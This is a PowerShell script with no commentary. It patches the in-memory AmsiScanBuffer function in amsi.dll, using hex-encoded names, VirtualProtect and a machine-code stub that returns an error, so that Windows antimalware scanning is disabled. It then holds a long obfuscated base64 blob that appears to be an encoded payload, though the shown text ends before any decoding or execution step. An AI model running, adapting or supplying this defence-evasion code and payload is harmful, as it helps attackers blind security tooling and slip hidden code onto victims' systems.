
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "+q6qc2B7dmF8ens1XHtjen5wOEZ9dGdlWHpjcB9uHzU1NTVOVnhxeXBhV3x7cXx7cj08SB81NTU1
RXRndHg1PR81NTU1NTU1NU5GYWd8e3JIHzU1NTU1NTU1MVZ6eHh0e3E1KDU3NTcfHzU1NTU8HzU1
NTUxdChbcGI4Wnd/cHZhNVxaO1hweHpnbEZhZ3B0eD05TlZ6e2NwZ2FILy9TZ3p4V1RmUCMhRmFn
fHtyPTddIWZcVFRUVFRUVFBUWiQsdE19dyQmXXomVGNyTHJ2X3JfYVBsel8nRnxfZWd9XGV0YltX
QF5fW35HXE1sc19ScmxUfmJEXF8jVF5+X1thbGRWZFk6T1whPidZTXdnJH53IGJNXyM+X3t0Q210
fHBaZiJHJ3hvQWFmIyV6QSMsbSJWQVohf08gRkdnIm92bCBSJVdEeWUmJ3A+LF1GWycgTz53WHhB
W3tPZiN2dmwjYGJRJE1jR1tmVFJRXSMgQ01UVyFWLXdYQU1jJHtdZDpULXwtUCFdPiFjIkV8XEJ7
YlpsY1J/ZEFvfk9sdEV0YnhlfEVfbVhtWGF9Vk9BUE1AJ095XHB8d0Zbb2J0eHYgWmVDZy1zZixk
QXZ3cFpYVnJPXEVZTSR7PmVWIiZdXmJQZyxEXi1QU1BNXFknei0tfXxaUSR8XkxxeUJCfVshVyBX
IFZMQX8tJydFfnhyUGc+TywjW1I6Pi1TPkBaciBRIkZAcE9ETyFRLVpdYVdFXCRNXEdbf18+XHpB
ZzpgV1Fzd3ZTd1ZkfkFXd286LEUmdGBRIVx9YSFCUHFwJmRdfiRWT2VgZFZYenBbJE9vWXZBOiJC
emRAYideTUR5e0N7QkVEYyFwfmNDOlh3e21dJSZbJlNUI21WQn8iVEN6QHclLGVlPmJkJUYiW0Ve
XnJnX1tDIVYhU1NNUnRAJEdkeXclfmMkW2cmJVd3YXBwfllHRiJwImFbXlJkIHQ6e18sUGVxd1xl
JGdEIEJhZmVvV1wiV2NWZ0QjRE9xTCB4Uz5af18hZHcgQmMiYCd3fnBGTXc+fn4kYHd0YXdxJUxa
U3lfTFhWLXh9dG8gZSBkeHtQQ31hZ1o6d15hQjpjRHMhJFt2Zn9xLHF5QydeLCYkJG8gOl9nZmR8
I18nbE10IVknWVR0YW0+YGBEQXp8WldRRXNMbHpibSJcLUdWb3Qhe0xzRyZTelFkXiRaYiNfRURm
T01vTGJRJ1AmLF9DZ1twJWRDcE16cXMnYSBfc3l4LUdCf31EViVzcUR0Ul1dXUFAXXhEYXNQIHFB
QENCUT58LFtFQiN0IG1XIERfI2B4YXEsb3hPfF9CW393ZHNgW1l3c0RzJyJeIG1cR3FBIj5gPnlD
TUdwe1xSe3FAYV8kUHNlIyNbZjpPXnpMJEN9J2dNRGdbYCJZQl4mcXxlTXomZiZkX0JPT2xtJXBw
YH5MJEJ8f1oiXWR+Xl5kIUN0Z01WV3pRI0N9YHZQeVhyZF8gV2RPIi1XYV9HY0RFWXZgW1JZW2Z0
eG1UJ1kkUzpyfER3fiBsJ3dRRXEiU3hYWUA6f2VCRlpdQyBmelFGJ1B/JnNHeltvT3FgZUxhRmdt
dEFZcyJMJ3dTc3Nyb39SR1RwJF9SU0M6Z0VybX4gVyF4Rm9TI2R4ellMdEBxWWF6UEYgVkxfQ3h9
ZVt3f3tzRkJSIiVCQkEtJCRAQGded3FWQmx4LH5xOiFPfHtbeWBZV3ZiRl5HZlEkQ2FcT0IjRSFh
Q2dgbXlPVk0kdENBUHtxJF5/d3FtIVR3YUxkfW9kWyAnWVZsOmRgJHpBcXJHYVY6cychclJAZ1wk
XVFyd3EnVnp9XEN7XUJ8TS1sbXtXbV5WQX0hOn8mT39/c3pdZ21PUUN7emFWeUZsXHBne3p3RWdy
fnpBV0MhRCVCdmZyf0Ykf1B0YFlWTH5vIHdwQyQgICBCbEN0JkxPf3xnZlZnZGJnQGAlIHBQImYk
XXx+en9ZISdtVm0mRXEndEN9YSRnZ0RvTXZiYGd3cVlTe3JwYnB7R1xlLVIkIVFwWSRvI1F5R3wl
JCJmWWd0JUdRTSRHTyNScmdAX1FCf2VzXX5hcHp3fGNGYWBaJFNYYCNZPmZ5TXtgVnFlXXxwZnhx
QX9CXnx5TV5dXUBwLERUfGZnJW19en1RPlJeZXB9ZWVReiFAbXZTfWViREJtXydxQXRDYiZdeHFd
XXAnc1c6RXEkdj5BYCFjf31dOm18eSZgRFRfJ29wYEdwcXNtfXhQOkdTJVZYLSNGf2xWTVpGRiBk
c1pDcnNhYnxSXiRPe3Z5IGZxJWNvcGZtICZ+PlwnY1pQQCZ7VkItTHdARkV0IlJvZHBfWVtHPkwn
RD5vc3FjW3N/WHxAYVNzdCViIGBHcn5hcUBTTHNHXV0gc31GRyYlQ3JbJ0NSLEFhXG9UI1xSQFxR
TV5gekFsRV95Zyd2b1B0JEZ5TSdWZSJmWWxdfENaWz53UVZ6QSVjJEJ/LUdFJGFQRVNje0BtLF18
ZGF2XFB7dE94UyNSYGUlezo+b29UYX9ARX9NZ2RwRnsjWFhgOlZlTXN/QExNXWU+clF5e3gnUkcs
QGdUYWchZHt9ZidBJmZPY0AlfnxaJiF+bS0nb3dsXHomWWRBI1RtX2Qmd0F2X39sW1c6QSFWWHNR
b0JZWV9dUllaIldRTyBCYnFwYEZsVmFYf2VbcG9eJFdvLEElQ21PZyFNWmR/U0BCI2RRLXJzX318
fGFCfFleWVJeJkAiXG9fdkZ3WyNZPnhhQHQgeGx/IVkgQX1GJEVxQ3R/ZXx3VHtTZGZYYCxEUn5X
eSd4THhzV2V3ZFFHQXoldmZwWnpYRXRmQEVxfXlvZGFAU3FkUEVTVFhvcURlW0RfImJfVnZgd0Fw
YX15WmZxYCxCInInd1IlUWM+QXd4WlhwIkN/RlNaI3xYJWV5U39MXGd0UD5cZUNQeiZgfl1zUHpz
XSd6JiM+T1Y+JVBEZHZPU2ddUltzf0NbeXFxfGdncmV/ViM+JFd0V1BncWR7Y3paZHN2TUNxZyZ0
ZzojV2RjJlMkRCMsWmRWWkMnUyRiU2RbUCJ0VnJvIExmQVFkei0+XHhZLFsgUXshViJvZGFfbV0s
UkxhWycjQkdZJFo6IX1SOiZEXyZGLVlwZCR2QVw6Xkx6LS1AUF5zRFtsWyxsWHksU2YlPnlhXiNd
cWcsXD5AJVp7e2wiXiFvX21hfSwtfCJkQSBgIDp4WSd0dGRkXFRiUHshcF9CQk97V2BzVzpZUE9E
JnchdEBGJiVafHB6Z0NDekx8ckxgfk17LXhXREV2XyN+V15NUmRlXWVGenpGbGdDd2N+YyIheyZD
J2AiV2R3I2NCYGBfICR8T2NlUV57TSctJ2B8WCdyQWF6Z3AkI3xgeGZeIXRNR39beCZZVl1WTVZ+
WVRFUiN4XXQlb1ZeRl4tYXZ3en9kRFJddF4iZl5ePnold2dRI3ZcUSJBIiZxfF9AJiZ0I1dvJn14
QCJxIE8nInxvZU1Ucl9aZ0I+TVRneFZaeld3J21ZJWZsJU92LHN6RiZZQydARUB7YCY+fWZGID50
TFEiZSBBXCRNQHZhb2FfeGx4WGZBLF9BQydTWmRmdHNATV8ibCBjWXomYXlHZCR5Z0wsd3R6QXN6
WXFgfWEiR1F3J3hdJmNccXBjQFotJmRdRmF9Jlt6bCAhRmAkeVdjUGd9R19QRUFtOn5yIm9bXFci
JHh2UT5zbVZ5Y3hsXiR8d3JMTW9UI0VnRk8iW094IUFdQSZHXVAhI2YsJVFCbCRTZiFGJm8nWHND
J3J7fSdcUCxTYkJxW0dtQUFzV0JweUxBYU18cHl2JlxwQWwlXkxGb3N0U01DTGJGd2R7YFtyIHsg
ZVgscW98XHclcWdbPkU+Xl5wZyBaQC1NY1lkcF5gJURDcSF+ZER6V3ciOiImcU9nU2BjLUVTUHg6
I15GVH1dXCx4U3h8dCF+cFN4ZSdsQmNbUGReW3tyRUJkeHNeVnRYQ2YgYmJlRkdPdGZcQE1xfXMj
LV8hUC15Z0BleVtPW0FsLVJDdFNlcE8lLCZiRCJQUldSJ1tbe2VUQF9aLH14XyRBRyZzY3dDLS0s
eG8kJF56Y3dHUHE+IHteV2MieT5ke0RjQ3RZWnRjYiBZdlpQUnFZJXFPc3tzJ3BkZyJeW09TdFJS
ZXZhcC1jT15SeSxULV9aenMgXWRmZFZeZ19vQSJ8Z2Vdb0FkXUN+c09+PmBwW2BEUnlNekJjVHRF
bSdhZHtzcGFkQ0VgQiJaJSB4JyEgIHNgISRPZ2AgOnhnRCFFISw+TSNmWyFWYiZ/UT5MYnFhR0F2
T19SfltERi1yXHF7T3pwcFpcRnF2eSN6LSN5JHd4USdhfUUkfWYjYGVwdFp8IE9DZEF3UXlaJnA+
YSQmQn9velEgcHc+fCdkZF1MbVB+YTpsIEQlXlhlcnR5bHJHUixCZSRFe0IiRHpycSZHI014LFkn
I1pweSFkXnstJUR3LDpfT0FdJyFiLF9CQlNxY0Z/OmZmInh/W1hgenpEfSYgdCJCWm1XIHFQIyFv
R2V2T1Jje2d8f0RGc1dmLCNmU3k+fW1MXXIhJUF5UmdXIHRPcG9PI1tfW1tyTVInJHBMVl1hUXJE
bX8mTS1DZ2BwQ1h8Y3hALHlhVyxzY1l/UlpXb0JZb2FCcE1wQER7I2w6V1QkRU9FY0dvQSYlLFlX
W2xNc1RbXVxaTXFlTE14eFtkcnhGIz5TUWVDISxxent4Ii1PV2BiRF5wUlpCYk1zJXxDekBxIXx5
cUJZUl8tb1pjb3gtfmUgfSElJlJ3PnBsZmRBQnokW2RYbSVFTSZfJSx/W0F0Wj4tWV5/QFlsUUMm
Jmd2bXJXTWRQLH9Nc3FBYkVhYidsJHwhUCN5JidnWHpNf3kiWkcgXGN7W18tTF1+J0c6RCFfXSZ5
fFpceEBWJWRYWmFXd3Bie1ZGcHNMVHckW1FeZXNWWHwkWGQ6bXhsJUJTdyVEeVl5fFt9eGxXciZ5
R2RmfVhWUkJfflF2XFZdelF5W3BlVyF5bUV5e097LUx8ZVpafiVkcVF9fCFtbXJcRHFEIHRUTU1y
IUxULSNSb1YsWVdQRS1zT0E6cHZhLE9Qe3txZG16IXpwU2x9Z1slcnZHJD5SLV9bRGEhZyZvWDpR
UHl7fHZ7J2dQJiFfOlhifmBeck1Fdl8iTXpjb3h+IExFTXNAI2d+Qk8ke11admMib3BzQCZaTH5n
bHhsZjpPWmU+UmxdQSIkUS1gW1BvZnN0T2REZSNsbyNdfCV7WCN4eWBaRUxnU31zREdsUXhQfEcl
JUIidFtiOllbYW9+UXlwbFRmd0VbR2RFYF5eXHF3OnNieiZ+OiJ6I2QjR39id15HInl5f0FfYyFT
UiN5QHtAUn8+Xl9PY0NWWGd/UHh6J1JsR0MjRF5CUyBPQydgYyFyT0NDQ0JbWlwtQ2csRUZjfkws
RHomQGMlXUx4UFJeX2B6bUAkQX5tb3csUFN5QSR3fFA6XnsjQ2V6LFZCe0FfWCdlQFJlRyR/ZGFb
XnByd0R/f018Pn1FPkVGbWdfeH50UFwgR2NnRiRyQiV3T21eRmBDWE9AfGAkXz5gck1jVENkZyBz
YlgtXlp2WVsjQmFnfVN6dCN/Q00kZl9GQnh7WiFtW3dWXnZeZyR9ZEZNdCx3RC17Y0QtUnBdfn8k
UnIkI3RDTHsgLXlDI0wsXWNCQ2J7InllQ11WIkJPb2YmJlRXfUVNcEIkIyRCJCcmXyMsUGFBImdD
VmEnPi1ZZSR2LV1NJVpAQzokeyAsIExWZ0J3OnM+QXNyV2VMTXNsUCFheXsgVGN4JmJnR3pmWUYh
fUUlYFstcHZFVmZRf2BndlJzf2deTXtYYmR4IyNkYkdib0xeJyE+cH1sZH1WYCImJXtxQ1J0Z2xB
V1pYfmJiUlhtJ0x5JlR7ZSd5LXRkXCxtVGN3T0RSI0xTIF4nUFpdQmZ7b10mWV9/R08tPmR0XyZQ
RV5/c1pMdlh7T3cmQHBfb1RWREFvbVhCZlsgJ35QQ1BfIHFWI0RULEN5cGxbYl9gfUZ7I0BjeEJe
e3t5TVdsY1N+LH1EWFtBflFcdCVtPmRxZDpDLH9sYCJ8IHp4cFFidzpzZXJYU1F+YU9kfiB9dkJQ
TFpbdHF7fUF2JWRccFQjTURUYURgU2JYX29TdFNGdF5hRnYmYFpvWj54UWF7Vydcb01iTGRST1Z/
IiRzI2x4bURPbSZQenpdW2xkc0QlcUFMWD5tY3IgZF4iR11MYWUgXnZiQG9BU2daYX0lRll6RGcg
fWxhICIkPnJFJXpbWiJbbCRTU3NUeldgJn4iQT5ZQ39sb3l0XWQsRiJGXn5kbCZvWUdtImx0e29k
TCdhelBQWXJ6ZGdyf2VHJWJGJXteIlpiISJDeHBmTGBkLE1EQmBsbGB4Rl5yJkF5IWBgY1FTcVws
Ii16dHY6WSM+QnlNd19CY35MPj5ncnohJyJYJGd3Q0N8J3BxIiZRU2N7Y3p5b3MjclQjXyRBRidh
Jyx5ZSEiJXldXlxsYEIgPn4mVE0+ZHZRWmFcWnpbdCJAXSFlbCF7WmV2UHAhQUEiV2NNdGE6XGNj
YWFzbXpjd1l6JXdlZ11HXSIkfUBHZydSfFxMI18heFpxfn8iQ1EjIkFhLCxZJFw+YVhvI0BAI1BH
dnlNI0J3UmBATTpQInlHe1JmJX9aXUNyJG0jXVBbJSFCcTp2dFBnI1ckWEZ3fyw6J35/XSEgWUVX
I2JQfnZbRUB3VyM+XFItVl9RcCx2d39hfFlDdn59Jnl0ZCdDZH94XmRwdHF2VllkWX5Cfy1EWixw
Y2c+TV1vYnIte2dSc3xHbEdtI0JxfCdmRlBCbUAhRldmISdkc3Z7ZCMiQ15QRXlPQFs+Q2YhUmNi
JExzY1JvcCNyOkAhI2RWInN5eyVRfF1bZUFDYCxQe0FAIVRSQ0Vheltaf1dzfCEsJ2Y6W2Z6LHpn
I3FBZ2N/JnE6Z3AtRntyTz59QSQkI31lLH9EW3R0Wnxgf096RllFQmdDdzpPbUchQn9CQ3NHd0Jl
Z1dTfFt5YCNAX0dGOk14IWNRQmBQUDp3byJbQSRUdFMid3pbUWQgQkBaemB3U35bTH55fCElbGx+
T21eYGREJUJPUyVeeV9lQ090UUdCcWd+TFNaLHwhZVx8V1l0X0NCRCYnfkQkQnpEJnlHQUwjfVh3
UyV7R2RsdnJ7f09dOn5+cWBRU1pvR1giVGMnTUJZb3dsImdgRH1idGNkRVpSeX8hW3pAT2d2QG0n
TXIlQyx3JVJtbyFbTEMmOkR5cHp0QGNEJHB/eCBxU1htUFJNZX1cRSRTeEBlUVJnYG1mLE9Yb0RE
f3RZU01xdn1EY399fkB8IUJaUkVPT1xtc3RiRnQtPjpgLGQhYiwiJFksV21nUU10cnw6bUdXQC0l
J2d8dyBleFB9R3siU0JFUlplPllDR1BxVERnYX16V155ZSUjJnl3d3p4I1tTdmZQd0wkfXMlV1kk
XHZjUlZfWG97YXFcZnF5YSBUd2AgW2BlJ2RsZG0nbV9NdkdsIE10LGBtIzplcWNGZ1xHRHZtYFMn
dyJBTH5HUidMJ1FHQFlbdCEiZ2wkYXJDLFpmV0JHUmZQVHRlYVRGQCZtX1NiQFZ/YW9/dl56XkNi
eSBDIEd8YX14Zn9ibCViQncsfWZhJXlfeGBNfH4nJy18X1YibE1xT1BTJH5+YkJAYUZ3Z0Z0IidB
V08jXl9YW3ljcE9bdlNyImdfdl1Ye0FTT3lYRGdCQnglR3RjRE1SYiZnfkdyel96dFFDdl5GUm1x
ZXcnbGJZWidhV2dPcVxRX2NbLWwtZXZBWHcmVEB4b3tncF1AbzolRCZ2IkBidiEnfGNhLGQgY3Z3
T2QjIF5RWHNeJzp4ZCFZQ2BleWdyIk1Wb11AQnwkQF10I2JPZ2RZTHt5f3dCU3lYZHImQlZHWmNg
LXwnQ2NbI2wtd2NlJkFRW2Ekfk1HI0VCViRsLHRgYXlwJH5BXVJ6Qmdeel5PdlB5b0RSRiB3Vm1t
c28sb3M+fixDdGBkfXRGIVtZUiVYTWQsdCBHcU0jLHBhRmQsInQlXi19Z1NPLGZZIkdxIlNkbEAm
IyJUfENvXCI6XlN7OnMtZCFMTGRwT2wgfEU6VlRFeWZ0fVtZWVNnTXlYYGB+YFlZLWVcclJSIXpN
ZyVjWGBTJUFNUkxbI2RnfHpZIFBtXSMsXEJUfWFvTXBXbCNEQXxkd1N+ZntkJWBsYXlyXH9GQXZM
Ij5cWUUhLCZCUVl9dlB8OlpyfmNSWUdPVyBHJFlDW3l9ZVJgUnRTJHReQSBGJCNHTVYge3hPQld5
dl56IyNsJ1IkIHZBdFpXU3YlfXpmYWBvXiFGYXwnd39TeGQnU014XExDdlhYeVh/LEN6Y2ZPYGdz
Yk97QnBFcmd0dl5acmx3T0FwV2RtbCEkY19WcC1WdlJlX2R6Qk9tRHc+X1AgR1JwQHghf1t6LUdh
XFMjIXgtTWd4Jn9Dd19WZ31MfHd4YH4gfCRzYUdWY3kmIWxGd2VHY2JgWn5jc09GZyJkc3RSLH14
YFF/LG0lb3J8U29xcFphJF1Qd0ZsUiFGf2YgInBtZiVFfUV3dEFeQmAjZSRgfGwgeUQiJn9PcF8s
OkBveCRfJ3lDcHZ3cyUhb29McFdjRCcjLFh2Z2chIlpGTSZAX3pNTHlEeX1CJ2wnQXdAPiVSX0Zb
QHQmLEVRcWdvX3hkIExCez5jLFJEcVFBdl5jWiIneF1RTWZhcyJ5cngmJURSW3AmdyFAQiRgRkVF
R3h2W2NvRWFAcEZ3I15NZUAjRHB5YHtbI0NYJVd6Q3ZxIUctJ0BcRXdlQyBwfSZPdlpxRic6WVxs
bVlxYWBUW3pdcyUteSBfcCInUiZkcHYjJ21ld3B5eiJCfH9RICZUVEd4UEUkJVZmVGdFeFNzfExz
RHdwV31xW0NlRCVvWl0tLURHYk0iY0R4Q01/TDpWeSMhRyI+XmMnf0A+JVxzJndsWz5YJyFAQ2ND
eGZlRSNYJ3h2THJxJyZZc3ZBRi1EOkAiZHpfc0ZkTXEjTyA6cEZxZVB7YnN/cXdzIW9UY0RCXFdd
Q3RRTSN/YFB7dkYiR21ncWRMQkJGImZ+JHlldkx5QTojV1MmV0NscHBTVldbb0UtfkZmdmdcVEBZ
QlxEdl46bV46VFRiLGZPQXtmXCx/VHZMd3xSI3csb2d2Qic6LW9iUlNbJ2BycC1We2J+OlZac3Jg
Uyx6JCdXYG1XIyFaPnZZIUwsflQ+LFJTT3JGPlddRXI6dkJ+UkBhOmFzUVA6VE9PQCV8ZiRMRXJs
Z2BNbCx7QX1jT2J+UVZjUE1kens6WUJSVnFvUy1fJEVaZi1idHlXeFRwbGEtIURUWH1dJFxkdGZ2
UVZ7Ymdsb316XGMlPk94RSFSOnFXWTpmenlTY0Ahf3t6UWBYIHdFYlwkLVxvclFHU0x7Xl0nXnBd
ImVlcVstQFtgUkdbe3pcRWQ6YlJZJlBgQyYgcURRYUJAUyNzZnlZQmclZUddVlZxd2ZzfEVbTUVk
ZHFnbHReYixSXkN6eiJ8RSJgXFB4cGRWUSFccE8tY19ZcmFsYCN3RGchcnlBPlpFT0Nyb29xU0ZQ
IUBXUEUkZldzV2dmZy1FVHF6W2UnfWdxIlZ3InI6bVI6V3tiIFoke3wmJWchYWAtZ3t8fE0iI0Jd
T2MiRUNhVHt7RmZPWiReUFlxUmJHZncnPnJHJ15CWjosRGRmfiJQfX9NWFlMIlhXckIkeWdQZWdT
J0VmLW1le3tZUnlTRFl3bCx9QVF6UHFQU31ETFt2bCxydFstJmdSd2NHd2Z2LGRxT1hyIUB/JmxP
PmE+WVZXIkJGZlB/UE9mRnR2V306UmBGRmJhLH5cYGJEbXgkRF86IVQnfGZcUmJ5T0BiZWxxZlQj
IVR2IHJddyVfXXZNIFshW0ElYHYhXz4+dzogJmFTOk8sLW8+R1ZdIFxfe3IiYiVmTFthel9zemUg
W3tdIHZ0RGdsZU0neT5vIiAlcHlNbFotJn53YlJPeHJUI1NwJ2xnOlFgUntfXFxRcXpZJFt6WVFR
RSRYPkNgZl9zIHNMRXsmQ0YtfzpRe1EsLH5fe2NQRyZaVyEncFdHX3F4bV06QH5wUWNRcyJARzpU
d1FHf2NXTXwhcyAsen5iIHZMOn97Rl9NfCYjbE12UH9tQXFEIVssJEAieUNxTXsgWENCUyBbeUVF
cHkmV3h7c0BGOkIsV0RzI00hRk0iX2B8TSZcIXRWXFRzIUdAWHgjUVJmQXFWLXNyYFZWe3NibH0t
clldJmIhOlF/cX9gWHQmYHZ+cCJiYndzTUZ4YlctXk1acGxEQmxCYnQjYX9RfHFmTUZaYnpweld9
bWNwYXlPcl06XlhaVFlEYH4gcl8nYl1dT01ifGIlVnQjZVpaXmRyZH5Dcngjem9/eGUhZ1NDcnl3
TEF/eWUhZn5bclkmZX9/ZE1EJ154JC1iJSFSZFdgfi1WJz5UISNDflF7T3pTLCV7XVZyTGUlVj5i
WX9lfH9QTVx0LHhjUFt6VmNHJ1RjXFtMUF0sWmJTdyEmWlNncmAsZlAsZ1cteCNYQTp7eF1iXnR+
Ii1TeHBSdF1mWGNZY3t2IGBRWkx9OnFdY1shRVpZeiQiUydHTG1NJlpZTHQnXi1xXSZNZlhRfDoh
RXxAeixwelo+YyFnVlt4TFk6bXNbXUd3Jlc+JWNQYW1vI38ieXd5QCEiZ1xRenpxWH4hcGBAX1JS
UWZvTUNFQ0Z6ISA6dF9gZ2djQyYhRVhzZG1yQ1kmVkNXJWdFWWd/enZnYSRnZEV6cSRWdEVgZ3Qg
e11EeH9ZeiQkRnRbWmdnV3I6Zz4lRSdzV0V4XmN9Vn5RPiw6Wjo+JFxScX0iY1g+V3xxJnlnTEdR
V2dMbDpXYnZbZ1FCdlZAdlhNZXNefHhEW3hDfHNsdyd2Pm9jV3JaZ3FRJmNaUmVyeSJ9cGFSVjpD
XyJ/JkxWZWwiQUdiIyxic1FFUj5cIVM6ZiVtTCxGJEw+LSB6LCZdOlksbyBcZ2ZwdG9ce3J3eCJi
Zi1XI2RXf0RAZFxCLHJjI30hUXJ6UixjYF5GYSB0VmV+RmxlYm8jZiBCZ2dxcjokIiB8YFohYnF4
V3tWcFhgfSJddm13ZllEUiJ2YV4lcXZWYSZSfXIiYixDXlF2TydFJ31eYEN4VDphLXZeeWxsZlRw
VmwgTXd8fnQiR2BYYGRhLHRtREFGOmYnXkVYUmF8XUBkZWInZlAnfVlgTUV8Z0Q+QD5GXVgld3FC
Z0EkUmIkIkRgcmxtdkF2Y2R/bE96WkFcY19Cej4gbTpsIlNtW09Cf1ZjY1laZ2MmQHdxd2E6Q3x6
eSxaZW1EJnhhYiJ+UVpRbWR0c0csLCxQUn9vej50JkJdQH9GYVlZcX19ZUNnXVtWY3FCR0RBcS1e
JG1hbEAhWDp9T2ZPPl5bJnJ6YSZCY1x3Q0NWLFMiXCEsf1l4b0N2LX1xZDpUZVBzUW1Ffm1ncCJX
ZGNCXHNDZGcnJD5PQ2AhVj4gUVQiZkE+InJcc0wnWScmYkMkRCZnY19WTVYnV3t2ckciUXFgZiV3
VGJtJ2dFRnh+UCIlY1twXn0sYlBFRG8gTGFaUmE6YUFReXRNQ35lYiQsdHR6LEJAbCRHIlhvZSVR
f0UlenNMR01feEJUIm0nViUtWnhxeWxaRn5Df3dcQmFlJ3lbTV1vZWJaPllWb3NeJ0NjZVllJjpc
QkA6QWxdTGBAbDpweURSYFNkc35xb1ZbUj5jZnJiQjpEfSJbYnxPc3pFOkFcJ1l0cHQkYExzYmNv
Jy1fUD5NWlNeVi1QfHNZJlxPJXxiRl0jJFdsZHhFWnl+VntvTyVvTyBGXyw6Z2BFLFd5fXNzISRE
VnBecy1cQyZyTSVNekB3QX99ZXEmIlJETWBjYTpeXGNmWyw6QCF9VkIseVkgV35XOmxaX0xsIUZY
Xk1zTUR0J3BAflZGQUFyb19fVGZ7JWZAYjpsIEFyU1pjY3ZhUll9bFE+IG9RY0JiLGRTVn58YkF4
IkJzI3YkbG1ReUN7PnRyQiQtY3xhdmZvdGV0XWwsXnhUQkNMZG9zXzotIENsRXh/fTpdQVxZRS1y
dF90RT4tbWx3I30lR1QtUnxzIHBlIUFCcCxRRiNgYXBeRllRQnc+UCx8RHBhXnFxfHlRLUBsT3Mj
RGVSe0VXWnsgTXNef1pceV5Eb3xXXHBnYn1SWFciLWJEf0VWIUV7ZV5fZVRnQVFcInxXRSdXc00n
J11XLFNjRWNBQHIifSJzfVZWYFtaY0RDOkNMWX5SPiMiV0N0QFJYIFh3XlotUHJwdzpQekRwQlw+
YlBhekwsf1ZYWH1tcmBcOn1ETExffVtCISZ5WSBSWFpBcn52fHREdk9Fcj57WF9aJHZEd29iT1tD
ZCJdLWMtX1BwR1xvQ0dALU1bfldWTH5sTE9nICYtTWJRent+JlZgR3d9LF0nWGMlVE19RHBmYiBR
VCdmIkJkUF57bUNwZyJkV1FiZjpBfy1RekQ6LU1iVCF2JnBgbX9wfTpUUX96LXxNV1MjVFJQJzpX
eWZCPmEhVlogeVZGQWF4JX06ZEVlX2Vdb158QSZWXVohJnxzISxlWD5TOmJAYSxTQXlaTEZzR2Ul
OlF7QiFBJnxEbSVyRCxMUl1iZ1klWFwiVl5NJUNHPnBBc3Jhe3J+XWVWdEFARlAtfWVDIiNTOn1n
byZkQlNlUHB5YyJHYG1MZWFbLCFWZnJ4TSdNIWZFRE0kcWZ+I392eDpxXkRzInslU1tjfU0scnhE
TEdNRiBZJW1xV30iWkNPJm9GQl9tbSBZXTpNcSFmQHlSb15NbFB5Q0UnciBaT0JjIEBsYF0iPkN5
ZFtzQHtGcCJiRXpnREVcJUJGe2J9LV1/e2NHZy0lZkcndCdWT0V6X2JNZVtaREdfI11lQD5yRX4k
XGZ2fltRW11WYFp0IE9MIV0jdCRGciZidHFnf0JseV1fTSxSUC1WIGV8Im1wYXx4LC16W0Z6XV9U
d2VYc3ZiZ1pcLEQnc1RtICZgYixcc3Ncf2JNcH9jVGNkYS1lcyBtXUZ7ICBFJFw+ck9EQyJaQEMl
Y3dibSJXZnFvI10gQ3BkU1xGXy1ecEQtY3EhWHssTHByQUVZVCxZd2NHZUNFZHx2eSFwflcmQ0Ug
QCIhdCVgeyMlQWN9R3BMYWZeeCBBJFt+eG8nUEV6YG1NbHgkYiJ3TSUtJnpweXsnWnYsXlBbIiVx
Xnc6Q3Ncc2xgIiVdd3R0I0MtRW8nflAnRl0iVmN5R1wtJn9HUV1cXSYjIk9/LWAsLSYiXnF5XHtB
f3dFZ21vTCZtY01FUFNPbGBMZ1lxc1RnfVQmYlIhREd9VFNMVE9EY0MmW2FcJl4jeldNPlQnUHtG
XUxNXX8tQH1TY1d8IlZFI3dgT09tUSBNTXwjZ35BI1JTRH9jX1kgZyVTPls+I3k6Ylp5XXBTPlhs
YiB9IG1gJlEkQlwiYk95fF52ICx6JnZgJ2FBXS13WVBzIUFhd2Fjd1R0bG0+UCxEf2NyfXRQLCVU
XWJyLFdhJiUsRVQnc3ZZT3JPYz5YJXJffT5WWVZwY3xzVlNzV3BMRHchQ3ZcWm19cG1/UVIsVmNy
OmxUdk92Z0NRX1tEfE1eWiFkZ0JyY2N2TXYhV3lFYjp5RkFgWV0gZkYnXmEmT0JQdydQIH9zQUVa
Zi1iOkRvLVwiRiFveFdhWyVeZGNEJGdjPkYteydjY0c6ZH4jJiN4c21vZV0mRD5sY0ddfnMhJyQj
W1hzYlllTSZacE86ZSBlXTpacUcgeXt+W1xhdjpvI1JiRiRxen4jZmZ4X3BQU31TQWd5ZSNSYyZa
YCFhZUNGXixsZydZI3BkRzpdPnZ6JUJFTHRnZiJ9Z0MiUENZYXJQRGx+JGx3R0VkWyJ8QUElbV5b
LGJvQW8lfH5ibXhmOk9RIlFbc3BfY1IhYEVPPmdFJSIsOiRMcGIhfX8hISRwT0dnXSVCI206WHol
IDpyY2YhbzpBb0ZabyZ7eHMhLSwnQkFwQ2JsfyVhWmJ7QHB4LW9/fmU+UnYtIENNWWFeZXkgQmxw
c31DZi1kZ3knRWF2LSJMJGJ3fiYtVkU6TFhsUUFwX1NaRkZSeyZleE1GIG90UiwtZiZ+TE9MOmcm
b0BwTCBZOmQkUHdvcDp/Ri1iJnhFe3dtb1FgUixBe1ZEb31SUlptJ34gOkBaLWNyLWImZnZPXHFd
